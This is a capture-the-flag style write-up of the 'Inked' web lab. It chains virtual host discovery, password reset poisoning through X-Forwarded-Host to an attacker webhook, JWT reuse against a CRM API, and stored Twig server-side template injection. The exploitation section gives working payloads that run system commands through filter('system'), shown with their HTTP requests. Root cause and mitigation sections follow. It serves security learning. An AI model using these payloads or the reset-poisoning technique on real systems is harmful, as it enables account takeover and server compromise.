---
title: "Password Reset Poisoning to Twig SSTI RCE | Inked"
date: 2026-06-23 20:35:00 +0530
categories: [A05 - Injection, SSTI]
tags: [webverse-pro, inked, password-reset-poisoning, host-header-injection, ssti, twig, rce, jwt, virtual-host-discovery]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/inked.webp
  alt: Inked - Password Reset Poisoning to Twig SSTI RCE
---

## Lab Link

[Inked](https://dashboard.webverselabs-pro.com/labs/inked)

---

## Overview

**Inked** was an end-to-end web exploitation lab built around Jill's Tatt Shop. The application had a public booking site, a separate staff dashboard, and a CRM API used by the dashboard.

The final chain combined multiple weaknesses:

1. Virtual host discovery exposed the staff dashboard.
2. Password reset poisoning allowed takeover of Jill's staff account.
3. The staff dashboard disclosed the internal CRM API host.
4. The CRM API accepted the staff JWT as a bearer token.
5. The public appointment message field was stored and later rendered by the CRM.
6. The CRM rendered the message through Twig, resulting in stored SSTI.
7. Twig SSTI was escalated to command execution and file read.

## Objective

Start as an anonymous visitor on the public site, gain access to the staff back office, pivot into the CRM API, and read the hidden file from the server.

## Vulnerability Identification

The initial public site exposed a booking form at:

```http
POST /booking.php HTTP/1.1
Host: inked.local
Content-Type: application/x-www-form-urlencoded
```

The site also disclosed the staff email address:

```text
jill@inked.local
```

After virtual host fuzzing, the staff dashboard was discovered on a separate host:

```text
admin.inked.local
```

The dashboard only exposed a login and password reset flow. The reset flow trusted the forwarded host header when generating the password reset link.

## Recon and Approach

The attack path started with host discovery and password reset testing.

The important hosts were added to `/etc/hosts`:

```text
<LAB_IP> inked.local admin.inked.local crmapi.inked.local
```

A password reset request was sent for Jill's account while poisoning the generated reset URL with `X-Forwarded-Host`.

```http
POST /forgot-password HTTP/1.1
Host: admin.inked.local
X-Forwarded-Host: <attacker-webhook>
Content-Type: application/x-www-form-urlencoded

email=jill@inked.local
```

The application generated a reset link using the attacker-controlled forwarded host. When the reset link was requested, the token was leaked to the webhook.

Using the leaked token, Jill's password was reset and the staff dashboard became accessible.

## Staff Dashboard Access

After resetting Jill's password, logging in to the staff dashboard issued a JWT cookie:

```http
Cookie: inked_jwt=<redacted-jwt>
```

The decoded JWT showed an admin role:

```json
{
  "iss": "inked-admin",
  "sub": "jill@inked.local",
  "name": "Jill Marrow",
  "role": "admin"
}
```

The dashboard then disclosed the CRM API host:

```text
crmapi.inked.local
```

The CRM API accepted the same JWT through the `Authorization` header.

```http
GET /appointments HTTP/1.1
Host: crmapi.inked.local
Authorization: Bearer <redacted-jwt>
Origin: http://admin.inked.local
```

The response returned appointment records from the CRM:

```json
{
  "appointments": [
    {
      "id": 1,
      "name": "Renata Cole",
      "email": "renata.cole@example.com",
      "artist": "Jill Marrow",
      "style": "Blackwork",
      "status": "new"
    }
  ]
}
```

## Stored SSTI Discovery

The public booking form accepted a `message` field. This value was stored as an appointment note and later rendered by the CRM appointment detail endpoint.

A basic SSTI probe was submitted in the public booking form.

{% raw %}
```http
POST /booking.php HTTP/1.1
Host: inked.local
Content-Type: application/x-www-form-urlencoded

name=test&email=test@test.com&phone=&preferred_date=&artist=No+preference&style=Blackwork&message={{7*7}}
```
{% endraw %}

The appointment was then viewed through the CRM API:

```http
GET /appointments/8 HTTP/1.1
Host: crmapi.inked.local
Authorization: Bearer <redacted-jwt>
Origin: http://admin.inked.local
```

The response rendered the expression result:

{% raw %}
```html
<div class="appt-note">49</div>
```
{% endraw %}

This confirmed stored server-side template injection.

## Template Engine Fingerprinting

To identify the template engine, `_self` was submitted as the message value.

{% raw %}
```text
{{_self}}
```
{% endraw %}

The CRM rendered:

```text
__string_template__f7cbd5e5118c73cdfac7b047ef1cfe3c
```

This behavior matched Twig-style template rendering.

## Exploitation

Twig's `filter('system')` behavior was used to execute system commands.

First, a file search payload was stored through the public booking form.

{% raw %}
```text
{{['find / -name "*flag.txt*" 2>/dev/null']|filter('system')}}
```
{% endraw %}

The CRM rendered the command output:

```text
/home/virgal/flag.txt
Array
```

The discovered file path was then read with another stored payload.

{% raw %}
```text
{{['cat /home/virgal/flag.txt']|filter('system')}}
```
{% endraw %}

Viewing the appointment detail through the CRM API executed the payload and displayed the file contents.

```http
GET /appointments/13 HTTP/1.1
Host: crmapi.inked.local
Authorization: Bearer <redacted-jwt>
Origin: http://admin.inked.local
```

## Proof / Flag

The CRM appointment detail rendered the flag from `/home/virgal/flag.txt`.

```text
WEBVERSE{redacted}
```

The original flag was intentionally redacted from this public writeup.

## Root Cause

The root cause was unsafe server-side rendering of user-controlled appointment notes.

The `message` field from the public booking form was stored without being treated as untrusted data. Later, the CRM API rendered that value as a Twig template instead of outputting it as escaped text.

A second major issue was password reset poisoning. The password reset flow trusted `X-Forwarded-Host` when building reset links, allowing an attacker to redirect reset tokens to an attacker-controlled domain.

## Impact

An unauthenticated attacker could chain these issues to achieve full server compromise:

- Discover the staff dashboard through virtual host enumeration.
- Poison the reset URL and steal Jill's password reset token.
- Take over Jill's staff account.
- Access the CRM API with an admin JWT.
- Store a malicious Twig payload through the public booking form.
- Trigger command execution by viewing the appointment through the CRM.
- Read sensitive files from the server.

## OWASP Top 10 2025 Classification

This maps primarily to:

```text
A05 - Injection
```

The final impact came from server-side template injection, which led to remote command execution.

The chain also involved:

```text
A01:2025 - Broken Access Control
A07:2025 - Identification and Authentication Failures
A05:2025 - Security Misconfiguration
```

## Mitigation

The application should apply the following fixes:

1. Never render user-controlled content as a server-side template.
2. Store appointment notes as plain text and HTML-escape them on output.
3. Remove dangerous Twig filters and functions from any user-influenced template context.
4. Use a strict allowlist for trusted proxy headers.
5. Do not use `X-Forwarded-Host` directly when generating password reset links.
6. Configure a fixed canonical application URL for password reset links.
7. Scope JWTs to specific services and validate audience claims.
8. Avoid exposing internal API hostnames in frontend JavaScript unless required.
9. Add server-side authorization checks to CRM endpoints.
10. Log and alert on suspicious template syntax in user-submitted fields.

## Lessons Learned

This lab showed how a low-risk-looking booking form can become a full compromise when stored data is later rendered by a privileged internal service.

The important lesson is that context changes risk. A public message field may look harmless on the public site, but if the staff CRM renders it as a template, it becomes an execution sink.

The full chain was:

```text
Virtual host discovery
→ admin dashboard found
→ password reset poisoning with X-Forwarded-Host
→ Jill account takeover
→ admin JWT obtained
→ CRM API discovered
→ appointment message rendered by CRM
→ Twig SSTI confirmed
→ command execution
→ flag file read
```
